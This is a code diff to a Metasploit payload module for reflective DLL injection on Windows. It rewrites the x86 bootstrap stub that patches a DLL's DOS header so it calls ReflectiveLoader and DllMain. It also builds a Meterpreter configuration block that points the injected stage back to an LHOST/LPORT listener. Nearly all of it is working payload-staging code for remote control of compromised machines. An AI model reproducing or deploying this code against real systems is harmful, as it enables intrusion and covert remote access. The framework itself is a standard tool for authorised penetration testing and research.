@@ -2,6 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/reflective_dll_loader'
+require 'rex/payloads/meterpreter/config'
 
 module Msf
 
@@ -30,11 +31,7 @@ module Payload::Windows::ReflectiveDllInject
       'Platform'      => 'win',
       'Arch'          => ARCH_X86,
       'PayloadCompat' => { 'Convention' => 'sockedi -https', },
-      'Stage'         =>
-        {
-          'Offsets'   => { 'EXITFUNC' => [ 33, 'V' ] },
-          'Payload'   => ""
-        }
+      'Stage'         => { 'Payload'   => "" }
       ))
 
     register_options( [ OptPath.new( 'DLL', [ true, "The local path to the Reflective DLL to upload" ] ), ], self.class )
@@ -44,31 +41,54 @@ module Payload::Windows::ReflectiveDllInject
     datastore['DLL']
   end
 
+  def asm_invoke_dll(opts={})
+    asm = %Q^
+        ; prologue
+          dec ebp               ; 'M'
+          pop edx               ; 'Z'
+          call $+5              ; call next instruction
+          pop ebx               ; get the current location (+7 bytes)
+          push edx              ; restore edx
+          inc ebp               ; restore ebp
+          push ebp              ; save ebp for later
+          mov ebp, esp          ; set up a new stack frame
+        ; Invoke ReflectiveLoader()
+          ; add the offset to ReflectiveLoader() (0x????????)
+          add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
+          call ebx              ; invoke ReflectiveLoader()
+        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
+          ; offset from ReflectiveLoader() to the end of the DLL
+          add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
+          mov [ebx], edi        ; write the current socket to the config
+          mov [ebx+4], esi      ; write the current listen socket to the config
+          push ebx              ; push the pointer to the configuration start
+          push 4                ; indicate that we have attached
+          push eax              ; push some arbitrary value for hInstance
+          mov ebx, eax          ; save DllMain for another call
+          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)
+        ; Invoke DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
+          ; push the exitfunk value onto the stack
+          push #{"0x%.8x" % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
+          push 5                ; indicate that we have detached
+          push eax              ; push some arbitrary value for hInstance
+          call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)
+    ^
+  end
+
   def stage_payload(target_id=nil)
     # Exceptions will be thrown by the mixin if there are issues.
     dll, offset = load_rdi_dll(library_path)
 
-    exit_funk = [ @@exit_types['thread'] ].pack( "V" ) # Default to ExitThread for migration
+    asm_opts = {
+      :rdi_offset => offset,
+      :length     => dll.length,
+      :exitfunk   => 'thread'
+    }
 
-    bootstrap = "\x4D" +                            # dec ebp             ; M
-          "\x5A" +                            # pop edx             ; Z
-          "\xE8\x00\x00\x00\x00" +            # call 0              ; call next instruction
-          "\x5B" +                            # pop ebx             ; get our location (+7)
-          "\x52" +                            # push edx            ; push edx back
-          "\x45" +                            # inc ebp             ; restore ebp
-          "\x55" +                            # push ebp            ; save ebp
-          "\x89\xE5" +                        # mov ebp, esp        ; setup fresh stack frame
-          "\x81\xC3" + [offset-7].pack( "V" ) + # add ebx, 0x???????? ; add offset to ReflectiveLoader
-          "\xFF\xD3" +                        # call ebx            ; call ReflectiveLoader
-          "\x89\xC3" +                        # mov ebx, eax        ; save DllMain for second call
-          "\x57" +                            # push edi            ; our socket
-          "\x68\x04\x00\x00\x00" +            # push 0x4            ; signal we have attached
-          "\x50" +                            # push eax            ; some value for hinstance
-          "\xFF\xD0" +                        # call eax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
-          "\x68" + exit_funk +                # push 0x????????     ; our EXITFUNC placeholder
-          "\x68\x05\x00\x00\x00" +            # push 0x5            ; signal we have detached
-          "\x50" +                            # push eax            ; some value for hinstance
-          "\xFF\xD3"                          # call ebx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
+    asm = asm_invoke_dll(asm_opts)
+
+    # generate the bootstrap asm
+    bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
 
     # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
     if( bootstrap.length > 62 )
@@ -79,30 +99,28 @@ module Payload::Windows::ReflectiveDllInject
     # patch the bootstrap code into the dll's DOS header...
     dll[ 0, bootstrap.length ] = bootstrap
 
-    # patch in the timeout options
-    timeout_opts = {
-      :expiration   => datastore['SessionExpirationTimeout'].to_i,
-      :comm_timeout => datastore['SessionCommunicationTimeout'].to_i,
-      :retry_total  => datastore['SessionRetryTotal'].to_i,
-      :retry_wait   => datastore['SessionRetryWait'].to_i,
+    # create the configuration block, which for staged connections is really simple.
+    config_opts = {
+      :expiration     => datastore['SessionExpirationTimeout'].to_i,
+      :uuid           => Msf::Payload::UUID.new({
+        :platform     => 'windows',
+        :arch         => ARCH_X86
+      }),
+      :transports     => [{
+        :scheme       => 'tcp',
+        :lhost        => datastore['LHOST'],
+        :lport        => datastore['LPORT'].to_i,
+        :comm_timeout => datastore['SessionCommunicationTimeout'].to_i,
+        :retry_total  => datastore['SessionRetryTotal'].to_i,
+        :retry_wait   => datastore['SessionRetryWait'].to_i
+      }],
+      :extensions     => []
     }
 
-    Rex::Payloads::Meterpreter::Patch.patch_timeouts!(dll, timeout_opts)
-
-    # patch the target ID into the URI if specified
-    if target_id
-      i = dll.index("/123456789 HTTP/1.0\r\n\r\n\x00")
-      if i
-        t = target_id.to_s
-        raise "Target ID must be less than 5 bytes" if t.length > 4
-        u = "/B#{t} HTTP/1.0\r\n\r\n\x00"
-        print_status("Patching Target ID #{t} into DLL")
-        dll[i, u.length] = u
-      end
-    end
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
 
     # return our stage to be loaded by the intermediate stager
-    return dll
+    return dll + config.to_b
   end
 
 end
